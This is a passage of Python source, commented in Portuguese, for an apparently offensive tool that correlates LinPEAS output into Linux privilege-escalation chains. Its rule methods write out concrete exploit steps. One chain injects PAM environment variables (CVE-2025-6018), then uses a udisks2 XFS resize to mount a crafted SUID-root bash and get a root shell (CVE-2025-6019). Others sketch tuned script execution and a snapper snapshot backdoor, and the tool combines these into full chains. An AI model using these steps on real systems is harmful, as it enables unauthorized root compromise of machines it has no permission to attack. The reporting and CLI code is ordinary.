                    'echo \'XDG_SEAT OVERRIDE=seat0\' > ~/.pam_environment',
                    'echo \'XDG_VTNR OVERRIDE=1\' >> ~/.pam_environment',
                    'Reconectar SSH (nova sessão)',
                    'Verificar: gdbus call --system --dest org.freedesktop.login1 '
                    '--object-path /org/freedesktop/login1 '
                    '--method org.freedesktop.login1.Manager.CanReboot',
                    'Se retornar "yes" → sessão é allow_active → combinar com chain de root',
                ],
                references=[
                    "https://cdn2.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt",
                ],
                confidence=confidence,
                notes=notes,
            ))

        # Research adicional
        if pam_version:
            self.research.append(
                f'🔍 Pesquisar: "pam {pam_version}" OR "linux-pam {pam_version}" '
                f'privilege escalation CVE'
            )

    # -----------------------------------------------------------------------
    # REGRA 3: Polkit Session Gap Analysis
    # -----------------------------------------------------------------------
    def _rule3_polkit_session_gap(self):
        """Analisa gap entre sessão inactive e ações allow_active."""
        has_polkit = self._has("D-Bus", "root_service", "PolicyKit")
        allow_active = self._has("polkit", "allow_active_found")

        session_type = self._get("Session", "session_type")
        session_active = self._get("Session", "session_active")

        is_inactive = (
            session_type in ("tty", "unspecified", None)
            or session_active == "no"
        )

        if has_polkit and allow_active and is_inactive:
            # Há um gap: ações requerem allow_active mas sessão é inactive
            for f in self.findings:
                if f.category == "polkit" and f.key == "allow_active_yes":
                    f.severity = Severity.HIGH
                    f.implication += " — REQUER bridge inactive→active (ver PAM chain)"

            self.research.append(
                "🔴 Gap de sessão detectado: polkit actions com allow_active=yes "
                "mas sessão é inactive/remote. Buscar bridge: PAM env injection, "
                "console access, ou SSH config com PAM chain."
            )

    # -----------------------------------------------------------------------
    # REGRA 4: D-Bus → Polkit → Root Chain Builder
    # -----------------------------------------------------------------------
    def _rule4_dbus_polkit_root(self):
        """Constrói cadeias D-Bus → polkit → root action."""
        root_services = self._get_all("D-Bus", "root_service")

        # Mapeamento de serviços D-Bus para cadeias conhecidas
        chain_map = {
            "org.freedesktop.UDisks2": self._chain_udisks2,
            "com.redhat.tuned": self._chain_tuned,
            "org.opensuse.Snapper": self._chain_snapper,
        }

        for svc in root_services:
            for svc_pattern, chain_builder in chain_map.items():
                if svc_pattern.lower() in svc.lower():
                    chain_builder()

    def _chain_udisks2(self):
        """Constrói chain de udisks2 → mount sem nosuid → root."""
        udisks_version = self._get("Package", "udisks2")
        has_xfs_growfs = self._has("Filesystem", "xfs_growfs")
        libblockdev_version = self._get("Package", "libblockdev")

        # Verificar se já temos chain de PAM
        has_pam_chain = any(
            "CVE-2025-6018" in c.cves for c in self.chains
        )

        preconditions = [
            "udisksd rodando como root",
            "polkit allow_active=yes para udisks2 actions",
        ]
        if has_pam_chain:
            preconditions.append("Sessão allow_active (via CVE-2025-6018 PAM chain)")
        else:
            preconditions.append("Sessão allow_active (via console/outro meio)")

        if has_xfs_growfs:
            preconditions.append("xfs_growfs disponível ✅")
        else:
            preconditions.append("xfs_growfs necessário (verificar se disponível)")

        self.chains.append(Chain(
            name="udisks2 XFS Resize → Mount sem nosuid → SUID root shell",
            cves=["CVE-2025-6019"],
            severity=Severity.CRITICAL,
            complexity="MÉDIA",
            preconditions=preconditions,
            steps=[
                "Na máquina ATACANTE: criar XFS image com SUID-root bash:",
                "  dd if=/dev/zero of=xfs.image bs=1M count=300",
                "  mkfs.xfs xfs.image",
                "  mount -o loop xfs.image /mnt",
                "  cp /bin/bash /mnt/bash && chmod 4755 /mnt/bash",
                "  umount /mnt",
                "Transferir xfs.image para o alvo (scp/wget)",
                "No ALVO:",
                "  udisksctl loop-setup --file ~/xfs.image",
                "  (Anotar loop device: /dev/loopN)",
                "  # Em background: monitorar /tmp/blockdev.*",
                "  while true; do ls /tmp/blockdev.*/bash 2>/dev/null && break; sleep 0.1; done &",
                "  gdbus call --system --dest org.freedesktop.UDisks2 \\",
                "    --object-path /org/freedesktop/UDisks2/block_devices/loopN \\",
                "    --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'",
                "  /tmp/blockdev.*/bash -p  # → euid=0 root",
            ],
            references=[
                "https://cdn2.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt",
                "https://www.suse.com/security/cve/CVE-2025-6019.html",
            ],
            confidence="ALTA" if has_pam_chain else "MÉDIA",
            notes=f"udisks2 version: {udisks_version or 'desconhecida'}, "
                  f"libblockdev: {libblockdev_version or 'desconhecida'}",
        ))

        # Research
        if udisks_version:
            self.research.append(
                f'🔍 Pesquisar: "udisks2 {udisks_version}" OR "udisks {udisks_version}" '
                f'privilege escalation CVE'
            )

    def _chain_tuned(self):
        """Constrói chain de tuned → script execution → root."""
        tuned_version = self._get("Package", "tuned")

        self.chains.append(Chain(
            name="tuned D-Bus → Script Execution → root",
            cves=["CVE-2024-52336"],
            severity=Severity.HIGH,
            complexity="MÉDIA",
            preconditions=[
                "tuned service ativo (com.redhat.tuned)",
                "polkit allow_active=yes para com.redhat.tuned.control",
                "Sessão allow_active",
            ],
            steps=[
                "Obter allow_active (se necessário, via PAM chain)",
                "Criar tuned profile malicioso com script_exec",
                "Ativar via D-Bus: busctl call com.redhat.tuned ...",
                "Script executa como root",
            ],
            references=[
                "https://security.opensuse.org/2024/11/26/tuned-instance-create.html",
            ],
            confidence="MÉDIA",
            notes=f"tuned version: {tuned_version or 'desconhecida'}. "
                  "Verificar se instance_create está disponível.",
        ))

    def _chain_snapper(self):
        """Constrói chain de snapper → snapshot manipulation."""
        has_btrfs = self._has("Filesystem", "btrfs")

        if has_btrfs:
            self.chains.append(Chain(
                name="Snapper D-Bus → Snapshot Manipulation → Persistence/Privesc",
                cves=["Pesquisar CVEs de snapper"],
                severity=Severity.MEDIUM,
                complexity="ALTA",
                preconditions=[
                    "snapper instalado e activatable via D-Bus",
                    "Btrfs filesystem com subvolumes",
                    "snapper-timeline.timer ativo (cria snapshots periódicos)",
                    "Sessão allow_active",
                ],
                steps=[
                    "Obter allow_active (via PAM chain se necessário)",
                    "Listar snapshots: busctl call org.opensuse.Snapper ... ListSnapshots",
                    "Criar snapshot com backdoor",
                    "Restaurar sobre sistema atual",
                ],
                confidence="BAIXA",
                notes="Requer pesquisa de CVEs específicos para versão instalada.",
            ))

    # -----------------------------------------------------------------------
    # REGRA 5: Multi-Step Chain Composition
    # -----------------------------------------------------------------------
    def _rule5_compose_chains(self):
        """Compõe cadeias multi-step a partir de cadeias parciais."""
        # Buscar chain de PAM (unprivileged → allow_active)
        pam_chains = [c for c in self.chains if "CVE-2025-6018" in c.cves]
        # Buscar chains que requerem allow_active (allow_active → root)
        root_chains = [c for c in self.chains if
                       any("allow_active" in p for p in c.preconditions)
                       and "CVE-2025-6018" not in c.cves]

        for pam_c in pam_chains:
            for root_c in root_chains:
                combined_name = f"FULL CHAIN: {pam_c.name} → {root_c.name}"
                combined_cves = list(set(pam_c.cves + root_c.cves))

                # Evitar duplicatas
                if any(c.name == combined_name for c in self.chains):
                    continue

                self.chains.append(Chain(
                    name=combined_name,
                    cves=combined_cves,
                    severity=Severity.CRITICAL,
                    complexity="MÉDIA",
                    preconditions=pam_c.preconditions,
                    steps=pam_c.steps + ["─── Allow_active obtido ───"] + root_c.steps,
                    references=list(set(pam_c.references + root_c.references)),
                    confidence=min(pam_c.confidence, root_c.confidence, key=lambda x: {"ALTA": 0, "MÉDIA": 1, "BAIXA": 2}[x]),
                    notes=f"Cadeia composta: step1={pam_c.name}, step2={root_c.name}",
                ))


# ============================================================================
# Reporter — Gera output formatado
# ============================================================================

class Reporter:
    """Gera relatórios formatados."""

    @staticmethod
    def print_report(findings: list[Finding], chains: list[Chain], research: list[str]):
        """Imprime relatório completo no terminal."""
        print("\n" + "=" * 80)
        print("  TAFFAI PRIVESC CORRELATOR — Relatório de Correlação")
        print("=" * 80)

        # Findings
        print(f"\n{'─' * 80}")
        print(f"  📊 FINDINGS ({len(findings)} encontrados)")
        print(f"{'─' * 80}")

        categories = {}
        for f in findings:
            categories.setdefault(f.category, []).append(f)

        for cat, items in sorted(categories.items()):
            print(f"\n  [{cat}]")
            for f in items:
                sev_str = f"  {f.severity}" if f.severity != Severity.INFO else ""
                impl_str = f"\n      └─ {f.implication}" if f.implication else ""
                print(f"    • {f.key}: {f.value}{sev_str}{impl_str}")

        # Chains
        print(f"\n{'─' * 80}")
        print(f"  🔗 CADEIAS DE EXPLORAÇÃO ({len(chains)} identificadas)")
        print(f"{'─' * 80}")

        # Ordenar por severidade
        severity_order = {Severity.CRITICAL: 0, Severity.HIGH: 1, Severity.MEDIUM: 2, Severity.LOW: 3}
        sorted_chains = sorted(chains, key=lambda c: severity_order.get(c.severity, 99))

        for i, chain in enumerate(sorted_chains, 1):
            is_full = chain.name.startswith("FULL CHAIN")
            prefix = "⭐" if is_full else "🔗"

            print(f"\n  {prefix} Chain #{i}: {chain.name}")
            print(f"     Severidade: {chain.severity}")
            print(f"     CVEs: {', '.join(chain.cves)}")
            print(f"     Complexidade: {chain.complexity}")
            print(f"     Confiança: {chain.confidence}")

            print(f"     Pré-condições:")
            for p in chain.preconditions:
                print(f"       ✓ {p}")

            print(f"     Passos:")
            for s in chain.steps:
                if s.startswith("─"):
                    print(f"       {s}")
                else:
                    print(f"       → {s}")

            if chain.notes:
                print(f"     Notas: {chain.notes}")

            if chain.references:
                print(f"     Refs:")
                for r in chain.references:
                    print(f"       📎 {r}")

        # Research
        if research:
            print(f"\n{'─' * 80}")
            print(f"  🔍 PESQUISAS RECOMENDADAS ({len(research)})")
            print(f"{'─' * 80}")
            for r in research:
                print(f"  {r}")

        # Summary
        print(f"\n{'=' * 80}")
        critical = sum(1 for c in chains if c.severity == Severity.CRITICAL)
        high = sum(1 for c in chains if c.severity == Severity.HIGH)
        full = sum(1 for c in chains if c.name.startswith("FULL CHAIN"))
        print(f"  RESUMO: {len(chains)} chains | {critical} CRITICAL | {high} HIGH | {full} full chains")
        print(f"  NEXT: Pesquisar CVEs recomendados e testar chain mais promissora")
        print("=" * 80 + "\n")

    @staticmethod
    def to_markdown(findings: list[Finding], chains: list[Chain], research: list[str]) -> str:
        """Gera relatório em Markdown."""
        lines = [
            "# Privesc Correlation Report\n",
            "## Dados Correlacionados\n",
            "| Categoria | Dado | Valor | Fonte | Implicação |",
            "|---|---|---|---|---|",
        ]

        for f in findings:
            impl = f.implication or "-"
            lines.append(f"| {f.category} | {f.key} | {f.value} | {f.source} | {impl} |")

        lines.append("\n## Cadeias de Exploração (priorizadas)\n")

        severity_order = {Severity.CRITICAL: 0, Severity.HIGH: 1, Severity.MEDIUM: 2, Severity.LOW: 3}
        sorted_chains = sorted(chains, key=lambda c: severity_order.get(c.severity, 99))

        for i, chain in enumerate(sorted_chains, 1):
            lines.append(f"### Chain {i}: {chain.name}")
            lines.append(f"- **CVEs:** {', '.join(chain.cves)}")
            lines.append(f"- **Severidade:** {chain.severity.name}")
            lines.append(f"- **Complexidade:** {chain.complexity}")
            lines.append(f"- **Confiança:** {chain.confidence}")
            lines.append(f"- **Pré-condições:**")
            for p in chain.preconditions:
                lines.append(f"  - {p}")
            lines.append(f"- **Passos:**")
            for s in chain.steps:
                lines.append(f"  1. {s}")
            if chain.notes:
                lines.append(f"- **Notas:** {chain.notes}")
            if chain.references:
                lines.append(f"- **Referências:**")
                for r in chain.references:
                    lines.append(f"  - {r}")
            lines.append("")

        if research:
            lines.append("\n## Pesquisas Recomendadas\n")
            for r in research:
                lines.append(f"- {r}")

        return "\n".join(lines)


# ============================================================================
# Main
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="TAFFAI Privesc Correlator — Correlação automática de CVE chains",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  %(prog)s --linpeas evidence/linpeas_output.txt
  %(prog)s --linpeas evidence/linpeas_output.txt --markdown > correlation_report.md
  %(prog)s --interactive
        """,
    )
    parser.add_argument("--linpeas", "-l", help="Caminho para output do LinPEAS")
    parser.add_argument("--markdown", "-m", action="store_true",
                        help="Gerar output em Markdown ao invés de terminal")
    parser.add_argument("--interactive", "-i", action="store_true",
                        help="Modo interativo (colar dados manualmente)")
    parser.add_argument("--json", "-j", action="store_true",
                        help="Gerar output em JSON")
    parser.add_argument("--extra", "-e", nargs="*",
                        help="Arquivos adicionais para análise (os-release, rpm list, etc.)")

    args = parser.parse_args()

    # Coletar conteúdo
    content = ""

    if args.linpeas:
        try:
            with open(args.linpeas, "r", errors="replace") as f:
                content = f.read()
            print(f"[+] LinPEAS output carregado: {args.linpeas} ({len(content)} bytes)")
        except FileNotFoundError:
            print(f"[!] Arquivo não encontrado: {args.linpeas}")
            sys.exit(1)
    elif args.interactive:
        print("[*] Modo interativo — cole os dados e pressione Ctrl+D quando terminar:")
        try:
            content = sys.stdin.read()
        except KeyboardInterrupt:
            print("\n[!] Cancelado")
            sys.exit(0)

    # --extra always appends (works with --linpeas too)
    if args.extra:
        for filepath in args.extra:
            try:
                with open(filepath, "r", errors="replace") as f:
                    content += f"\n\n=== {filepath} ===\n" + f.read()
                print(f"[+] Arquivo extra carregado: {filepath}")
            except FileNotFoundError:
                print(f"[!] Arquivo não encontrado: {filepath}")

    if not args.linpeas and not args.interactive and not args.extra:
        parser.print_help()
        print("\n[!] Forneça --linpeas, --interactive, ou --extra")
        sys.exit(1)

    if not content.strip():
        print("[!] Nenhum conteúdo para analisar")
        sys.exit(1)

    # Extrair dados
    extractor = DataExtractor()
    findings = extractor.extract_from_linpeas(content)
    print(f"[+] {len(findings)} findings extraídos")

    # Correlacionar
    correlator = Correlator(findings)
    chains, research = correlator.correlate_all()
    print(f"[+] {len(chains)} chains identificadas")
    print(f"[+] {len(research)} pesquisas recomendadas")

    # Output
    if args.markdown:
        print(Reporter.to_markdown(findings, chains, research))
    elif args.json:
        report = {
            "findings": [
                {
                    "category": f.category,
                    "key": f.key,
                    "value": f.value,
                    "source": f.source,
                    "implication": f.implication,
                    "severity": f.severity.name,
                }
                for f in findings
            ],
            "chains": [
                {
                    "name": c.name,
                    "cves": c.cves,
                    "severity": c.severity.name,
                    "complexity": c.complexity,
                    "confidence": c.confidence,
                    "preconditions": c.preconditions,
                    "steps": c.steps,
                    "references": c.references,
                    "notes": c.notes,
                }
                for c in chains
            ],
            "research": research,
        }
        print(json.dumps(report, indent=2, ensure_ascii=False))
    else:
        Reporter.print_report(findings, chains, research)


if __name__ == "__main__":
    main()
# --- END CORRELATOR ---
````
